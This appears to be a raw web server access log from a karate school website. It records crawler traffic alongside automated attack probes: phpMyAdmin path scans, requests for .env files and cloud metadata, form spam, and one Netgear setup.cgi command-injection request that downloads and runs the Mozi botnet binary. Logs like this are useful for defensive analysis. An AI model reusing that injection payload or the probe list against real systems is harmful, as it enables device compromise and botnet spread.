::ffff:67.168.134.140 - - [20/Aug/2022:11:13:48 +0000] "GET /admin/sysadmin/index.php?lang=en HTTP/1.1" 404 163 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:48 +0000] "GET /sql/phpMyAdmin2/index.php?lang=en HTTP/1.1" 404 164 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:48 +0000] "GET /administrator/db/index.php?lang=en HTTP/1.1" 404 165 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:48 +0000] "GET /phpmy/index.php?lang=en HTTP/1.1" 404 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:48 +0000] "GET /phpMyAdmin-5.1.1/index.php?lang=en HTTP/1.1" 404 165 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:48 +0000] "GET /administrator/phpmyadmin/index.php?lang=en HTTP/1.1" 404 173 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:48 +0000] "GET /phpMyadmin/index.php?lang=en HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:48 +0000] "GET /phpmyadmin5/index.php?lang=en HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:48 +0000] "GET /sqlmanager/index.php?lang=en HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:48 +0000] "GET /phpMyAdmin5/index.php?lang=en HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:48 +0000] "GET /db/phpMyAdmin-5/index.php?lang=en HTTP/1.1" 404 164 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:48 +0000] "GET /db/websql/index.php?lang=en HTTP/1.1" 404 158 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:49 +0000] "GET /admin/index.php?lang=en HTTP/1.1" 404 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:49 +0000] "GET /phpmyadmin2013/index.php?lang=en HTTP/1.1" 404 163 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:49 +0000] "GET /phpmyadmin1/index.php?lang=en HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:49 +0000] "GET /phpMyAdmin5.1/index.php?lang=en HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:49 +0000] "GET /phpMyAdmin-3/index.php?lang=en HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:49 +0000] "GET /phpMyAdmin-5.1.3/index.php?lang=en HTTP/1.1" 404 165 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:49 +0000] "GET /phpMyAdmin4/index.php?lang=en HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:49 +0000] "GET /_phpmyadmin/index.php?lang=en HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:49 +0000] "GET /mysql/dbadmin/index.php?lang=en HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:49 +0000] "GET /db/webdb/index.php?lang=en HTTP/1.1" 404 157 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:49 +0000] "GET /mysql/admin/index.php?lang=en HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:49 +0000] "GET /phpmyadmin2019/index.php?lang=en HTTP/1.1" 404 163 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:49 +0000] "GET /db/dbweb/index.php?lang=en HTTP/1.1" 404 157 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:49 +0000] "GET /phpMyAdmin1/index.php?lang=en HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:49 +0000] "GET /db/index.php?lang=en HTTP/1.1" 404 151 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:49 +0000] "GET /mysql/web/index.php?lang=en HTTP/1.1" 404 158 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:49 +0000] "GET /php-my-admin/index.php?lang=en HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:49 +0000] "GET /phpMyAdmin_/index.php?lang=en HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:49 +0000] "GET /phpmyadmin2018/index.php?lang=en HTTP/1.1" 404 163 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:49 +0000] "GET /phpMyAdmin5.2/index.php?lang=en HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:49 +0000] "GET /mysql/pMA/index.php?lang=en HTTP/1.1" 404 158 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:49 +0000] "GET /phpmyadmin2015/index.php?lang=en HTTP/1.1" 404 163 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:49 +0000] "GET /phpmyadmin2014/index.php?lang=en HTTP/1.1" 404 163 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:49 +0000] "GET /shopdb/index.php?lang=en HTTP/1.1" 404 155 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:49 +0000] "GET /sql/phpmyadmin5/index.php?lang=en HTTP/1.1" 404 164 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:49 +0000] "GET /mysqlmanager/index.php?lang=en HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:49 +0000] "GET /db/phpMyAdmin-4/index.php?lang=en HTTP/1.1" 404 164 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:49 +0000] "GET /myadmin/index.php?lang=en HTTP/1.1" 404 156 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:49 +0000] "GET /admin/pma/index.php?lang=en HTTP/1.1" 404 158 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:49 +0000] "GET /sql/phpmanager/index.php?lang=en HTTP/1.1" 404 163 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:49 +0000] "GET /_phpmyadmin_/index.php?lang=en HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:49 +0000] "GET /sql/myadmin/index.php?lang=en HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:50 +0000] "GET /admin/web/index.php?lang=en HTTP/1.1" 404 158 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:50 +0000] "GET /phpMyAdmin-4/index.php?lang=en HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:50 +0000] "GET /mysql/index.php?lang=en HTTP/1.1" 404 154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:50 +0000] "GET /phpMyAdmin-4.9.7/index.php?lang=en HTTP/1.1" 404 165 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:50 +0000] "GET /pma/index.php?lang=en HTTP/1.1" 404 152 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:50 +0000] "GET /sql/sqladmin/index.php?lang=en HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:50 +0000] "GET /mysql-admin/index.php?lang=en HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:50 +0000] "GET /sql/sqlweb/index.php?lang=en HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:50 +0000] "GET /db/phpmyadmin5/index.php?lang=en HTTP/1.1" 404 163 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:50 +0000] "GET /db/phpMyAdmin-3/index.php?lang=en HTTP/1.1" 404 164 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:50 +0000] "GET /phpmyadmin2/index.php?lang=en HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:50 +0000] "GET /db/phpmyadmin/index.php?lang=en HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:50 +0000] "GET /_phpMyAdmin/index.php?lang=en HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:50 +0000] "GET /MyAdmin/index.php?lang=en HTTP/1.1" 404 156 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:50 +0000] "GET /sql/phpmyadmin4/index.php?lang=en HTTP/1.1" 404 164 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:50 +0000] "GET /phpmyadmin_/index.php?lang=en HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:50 +0000] "GET /phpMyAdmin-5/index.php?lang=en HTTP/1.1" 404 161 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:50 +0000] "GET /phpMyAdmin-5.1.0/index.php?lang=en HTTP/1.1" 404 165 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:50 +0000] "GET /sql/sql/index.php?lang=en HTTP/1.1" 404 156 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:50 +0000] "GET /db/phpMyAdmin3/index.php?lang=en HTTP/1.1" 404 163 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:50 +0000] "GET /db/myadmin/index.php?lang=en HTTP/1.1" 404 159 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:50 +0000] "GET /phpmy-admin/index.php?lang=en HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:50 +0000] "GET /sql/webdb/index.php?lang=en HTTP/1.1" 404 158 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:50 +0000] "GET /db/db-admin/index.php?lang=en HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:67.168.134.140 - - [20/Aug/2022:11:13:50 +0000] "GET /admin/phpmyadmin/index.php?lang=en HTTP/1.1" 404 165 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
::ffff:185.83.144.103 - - [20/Aug/2022:11:14:04 +0000] "GET /phpinf.php HTTP/1.1" 404 149 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:157.55.39.117 - - [20/Aug/2022:11:18:15 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 200 37245 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:185.220.101.60 - - [20/Aug/2022:11:25:13 +0000] "GET http://169.254.169.254/latest/meta-data/ HTTP/1.1" 404 156 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
::ffff:157.55.39.86 - - [20/Aug/2022:11:28:57 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 200 32400 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:66.249.69.28 - - [20/Aug/2022:11:31:20 +0000] "GET /contact?s=1&ss=4 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.69.26 - - [20/Aug/2022:11:31:20 +0000] "GET / HTTP/1.1" 304 - "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:185.20.226.243 - - [20/Aug/2022:11:40:31 +0000] "GET / HTTP/1.0" 200 58071 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:192.241.236.93 - - [20/Aug/2022:11:46:44 +0000] "GET /portal/redlion HTTP/1.1" 404 153 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:157.55.39.245 - - [20/Aug/2022:11:52:19 +0000] "GET /images/instructors/andrea.jpg HTTP/1.1" 200 61330 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:66.249.69.30 - - [20/Aug/2022:11:53:50 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:192.241.208.228 - - [20/Aug/2022:11:55:07 +0000] "GET /actuator/health HTTP/1.1" 404 154 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:207.46.13.74 - - [20/Aug/2022:11:58:45 +0000] "GET /katas.html HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:192.241.219.31 - - [20/Aug/2022:12:04:49 +0000] "GET /hudson HTTP/1.1" 404 145 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:185.254.196.115 - - [20/Aug/2022:12:05:02 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [20/Aug/2022:12:05:03 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:46.161.11.238 - - [20/Aug/2022:12:09:56 +0000] "GET / HTTP/1.0" 200 58071 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.1; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:46.161.11.238 - - [20/Aug/2022:12:09:56 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 6.1; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:46.161.11.238 - - [20/Aug/2022:12:09:57 +0000] "GET /?err=error HTTP/1.0" 200 58623 "http://wadokikai.org/?err=error#signup" "Mozilla/5.0 (Windows NT 6.1; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:207.46.13.74 - - [20/Aug/2022:12:13:26 +0000] "GET /katas.html HTTP/1.1" 404 149 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:66.249.65.197 - - [20/Aug/2022:12:14:02 +0000] "GET /terminology.php HTTP/1.1" 404 154 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.69.28 - - [20/Aug/2022:12:16:20 +0000] "GET /contact?s=1&ss=11 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:135.125.244.48 - - [20/Aug/2022:12:18:35 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [20/Aug/2022:12:18:36 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:51.222.253.9 - - [20/Aug/2022:12:22:43 +0000] "GET /contact?s=1&ss=9 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.20 - - [20/Aug/2022:12:22:46 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.14 - - [20/Aug/2022:12:22:46 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:66.249.69.28 - - [20/Aug/2022:12:38:50 +0000] "GET /instructors HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:167.99.34.229 - - [20/Aug/2022:12:53:20 +0000] "GET / HTTP/1.1" 200 58071 "-" "Linux Gnu (cow)"
::ffff:46.161.11.227 - - [20/Aug/2022:12:55:08 +0000] "GET / HTTP/1.0" 200 58071 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:46.161.11.227 - - [20/Aug/2022:12:55:09 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:46.161.11.227 - - [20/Aug/2022:12:55:09 +0000] "GET /?err=error HTTP/1.0" 200 58623 "http://wadokikai.net/?err=error#signup" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:66.249.69.28 - - [20/Aug/2022:13:01:20 +0000] "GET /joinemail?type=promotions HTTP/1.1" 200 8841 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.69.28 - - [20/Aug/2022:13:01:21 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 304 - "-" "Googlebot-Image/1.0"
::ffff:118.193.58.104 - - [20/Aug/2022:13:03:10 +0000] "GET / HTTP/1.1" 200 58071 "-" "curl/7.29.0"
::ffff:118.26.110.74 - - [20/Aug/2022:13:03:31 +0000] "GET / HTTP/1.1" 200 58071 "-" "curl/7.29.0"
::ffff:120.85.114.52 - - [20/Aug/2022:13:06:22 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 148 "-" "-"
::ffff:106.75.28.105 - - [20/Aug/2022:13:11:14 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3"
